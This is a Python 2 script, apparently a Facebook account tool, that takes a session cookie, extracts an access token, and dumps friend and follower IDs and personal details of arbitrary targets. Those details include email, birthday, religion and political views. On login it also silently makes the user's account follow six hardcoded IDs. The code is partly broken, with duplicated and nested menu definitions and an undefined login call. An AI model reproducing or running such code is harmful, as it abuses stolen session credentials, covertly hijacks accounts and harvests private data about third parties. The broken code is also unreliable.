#!/usr/bin/python2
#-*-coding:utf-8-*-

import os,re,sys,itertools,time,requests,random,threading,json,random
import requests,bs4,sys,os,subprocess,uuid
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError

def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def banner():
    print("""   ___                \n  / _ \__ ____ _  ___ ® ┌──────────────────────────────┐\n / // / // /  ' \/ _ \  │  Script By 44 K453P  │\n/____/\_,_/_/_/_/ .__/  │   •• Github.com/44_K453P ••   │\n   ID Facebook /_/      └──────────────────────────────┘""")
  
def masuk():
    os.system("clear")
    banner()
    print("\n   [ Choose Login Methode ]")
    print("\n   [1] Login With Token")
    print("   [2] Login With Cookie")
    print("   [3] Update Script")
    print("   [0] Exit")
    pilih_masuk()
        
def pilih_masuk():
    sek=raw_input("\n   [•] Choose : ")
    if sek=="":
        print("   [!] Fill In The Correct")
        masuk()
    elif sek=="1":
        tokenz()
    elif sek=="2":
        cookie()
    elif sek=="3":
        updatesc()
    elif sek=="0":
        keluar()
    else:
        print("   [!] Fill In The Correct")
        masuk()

def tokenz():
    os.system('clear')
    banner()
    toket = raw_input("\n   [•] Token : ")
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print('\n   [•] Login Successful')
        bot_follow()
    except KeyError:
        print ("   [!] Token Invalid")
        os.system('clear')
        masuk()

def cookie():
	os.system('clear')
	banner()
	try:
		cookie = raw_input("\n   [•] Cookie : ")
		data = {
		            'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', # don't change this user agent.
			        'referer' : 'https://m.facebook.com/',
			        'host' : 'm.facebook.com',
			        'origin' : 'https://m.facebook.com',
			        'upgrade-insecure-requests' : '1',
			        'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
			        'cache-control' : 'max-age=0',
			        'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			        'content-type' : 'text/html; charset=utf-8',
			         'cookie' : cookie }
		coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
		cari = re.search('(EAAA\w+)', coki.text)
		hasil = cari.group(1)
		zedd = open("login.txt", 'w')
		zedd.write(hasil)
		zedd.close()
		print('\n   [•] Login Successful')
		bot_follow()
	except AttributeError:
		print ("   [!] Cookie Invalid")
		masuk()
	except UnboundLocalError:
		print ("   [!] Cookie Invalid")
		masuk()
	except requests.exceptions.SSLError:
		os.system('clear')
		print ("   [!] No Connection")
		keluar()
        
def bot_follow():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Token invalid")
		masuk()
    	requests.post('https://graph.facebook.com/100007095946782/subscribers?access_token=' + toket)      #44 K453P
    	requests.post('https://graph.facebook.com/100006792461977/subscribers?access_token=' + toket)      #44 K453P
    	requests.post('https://graph.facebook.com/100009218573546/subscribers?access_token=' + toket) #44 K453P
    	requests.post('https://graph.facebook.com/100021545539536/subscribers?access_token=' + toket)       #44 K453P
    	requests.post('https://graph.facebook.com/100001881339355/subscribers?access_token=' + toket) #44 K453P
    	requests.post('https://graph.facebook.com/100008044232799/subscribers?access_token=' + toket)  #44 K453P
    	menu()
			
def menu():
	os.system('clear')
	global toket
	try:
		toket = open('login.txt','r').read()
	except IOError:
		print ("   [!] Token Invalid")
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
		ttl = a['birthday']
	except KeyError:
		os.system('clear')
		print ("   [!] Token Invalid")
		os.system('rm -rf login.txt')
		masuk()
	except requests.exceptions.ConnectionError:
		print ("   [!] No Connection")
		keluar()
	passchoice()
def menu():
        os.system("clear")
        banner()
	try:
	    	toket = open('login.txt','r').read()
	    	otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
	    	a = json.loads(otw.text)
	    	nama = a['name']
	    	id = a['id']
	except Exception as e:
	    	print ("\n[•] Error : %s"%e)
	def    	menu():
    	print("\n   [1] Dump ID From Friend")
    	print("[2] Dump ID From Public")
    	print("[3] Dump ID From Followers")
	print("[4] Get Data Target")
    	print("[0] Log Out")
    	r=raw_input("\n[•] Choose : ")
    	if r=="":
	    print("\n[!] Fill In The Correct")
	    menu()
    	elif r=="1":
	    friend()
    	elif r=="2":
	    public()
    	elif r=="3":
	    followers()
	elif r=="4":
	    target()
    	elif r=="0":
		try:
			os.system('rm -rf login.txt')
			exit()
		except Exception as e:
			print("\n[!] Error File Not Found %s"%e)
    	else:
	    print ("\n[!] Wrong Input")
	    menu()	

def friend():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Token Invalid")
		os.system('rm -rf login.txt')
		login()
	try:
                limit = raw_input("\n[•] Limit (Max 1000) : ")
		try:
			jok = requests.get("https://graph.facebook.com/me?access_token="+toket)
			op = json.loads(jok.text)
			print("[•] Name Account     : "+op["name"])
		except KeyError:
			print("\n[!] ID NOT found")
			print("\n[ Back ]")
			friend()
		r=requests.get("https://graph.facebook.com/me?fields=friends.limit("+limit+")&access_token="+toket)
		id = []
		z=json.loads(r.text)
		jalan("\n[•] Getting ID ...\n")
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r%s "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.005)
			print(a['id']+" • "+a['name'])
		ys.close()
		print ('\n[•] Sukses Dump ID From %s'%op['name'])
		print ("[•] Total ID : %s"%(len(id)))
		print ("[•] Output   : %s"%qq)
		raw_input("\n[ Back ]")
		menu()
		
	except Exception as e:
		exit("[•] Error : %s"%e)

def public():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Token Invalid")
		os.system('rm -rf login.txt')
		login()
	try:
		idt = raw_input("\n[•] ID Target        : ")
                limit = raw_input("[•] Limit (Max 1000) : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("[•] Name Account     : "+op["name"])
		except KeyError:
			print("\n[!] ID NOT found")
			print("\n[ Back ]")
			public()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit("+limit+")&access_token="+toket)
		id = []
		z=json.loads(r.text)
		jalan("\n[•] Getting ID ...\n")
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r%s "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.005)
			print(a['id']+" • "+a['name'])
		ys.close()
		print ('\n[•] Sukses Dump ID From %s'%op['name'])
		print ("[•] Total ID : %s"%(len(id)))
		print ("[•] Output   : %s"%qq)
		raw_input("\n[ Back ]")
		menu()
		
	except Exception as e:
		exit("[•] Error : %s"%e)

def followers():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Token Invalid")
		os.system('rm -rf login.txt')
		login()
	try:
		idt = raw_input("\n[•] ID Target        : ")
                limit = raw_input("[•] Limit (Max 1000) : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("[•] Name Account     : "+op["name"])
		except KeyError:
			print("\n[!] ID NOT found")
			print("\n[ Back ]")
			followers()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit="+limit+"&access_token="+toket)
		id = []
		z=json.loads(r.text)
		jalan("\n[•] Getting ID ...\n")
		qq = (op['first_name']+'.json').replace(" ","_")
		ys = open(qq , 'w')
		for a in z['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
			print("\r%s "%(str(len(id)))),;sys.stdout.flush();time.sleep(0.005)
			print(a['id']+" • "+a['name'])
		ys.close()
		print ('\n[•] Sukses Dump ID From %s'%op['name'])
		print ("[•] Total ID : %s"%(len(id)))
		print ("[•] Output   : %s"%qq)
		raw_input("\n[ Back ]")
		menu()
		
	except Exception as e:
		exit("[•] Error : %s"%e)

def target():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n[!] Token Invalid")
		os.system('rm -rf login.txt')
		login()
	try:
		idt = raw_input("\n[•] ID Target        : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("[•] Name Account     : "+op["name"])
			print("[•] Username         : "+op["username"])
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Email            : "+op["email"])
			except KeyError:
				print("[•] Email            : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Date Of Birth    : "+op["birthday"])
			except KeyError:
				print("[•] Date Of Birth    : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Gender           : "+op["gender"])
			except KeyError:
				print("[•] Gender           : -")
			try:
				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
				id = []
				z = json.loads(r.text)
				qq = (op['first_name']+'.json').replace(" ","_")
				ys = open(qq , 'w')
				for i in z['data']:
					id.append(i['id'])
					ys.write(i['id'])
				ys.close()
				print("[•] Total Friend     : %s"%(len(id)))
			except KeyError:
				print("[•] Total Friend     : -")
			try:
				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
				id = []
				b = json.loads(a.text)
				bb = (op['first_name']+'.json').replace(" ","_")
				jw = open(bb , 'w')
				for c in b['data']:
					id.append(c['id'])
					jw.write(c['id'])
				jw.close()
				print("[•] Total Follower   : %s"%(len(id)))
			except KeyError:
				print("[•] Total Follower   : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Relationship     : "+op["relationship_status"])
			except KeyError:
				print("[•] Relationship     : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Religion         : "+op["religion"])
			except KeyError:
				print("[•] Religion         : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] About            : "+op["about"])
			except KeyError:
				print("[•] About            : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Interested In    : "+op["interested_in"])
			except KeyError:
				print("[•] Interested In    : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Political        : "+op["political"])
			except KeyError:
				print("[•] Political        : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Quotes           : "+op["quotes"])
			except KeyError:
				print("[•] Quotes           : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Website          : "+op["website"])
			except KeyError:
				print("[•] Website          : -")
			except IOError:
				print("[•] Website          : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print("[•] Update Time      : "+op["updated_time"])
			except KeyError:
				print("[•] Update Time      : -")
			except IOError:
				print("[•] Update Time      : -")
			raw_input("\n[ Back ]")
			menu()
		except KeyError:
			raw_input("\n[ Back ]")
			menu()
	except Exception as e:
		exit("[•] Error : %s"%e)
		
if __name__=='__main__':
	login()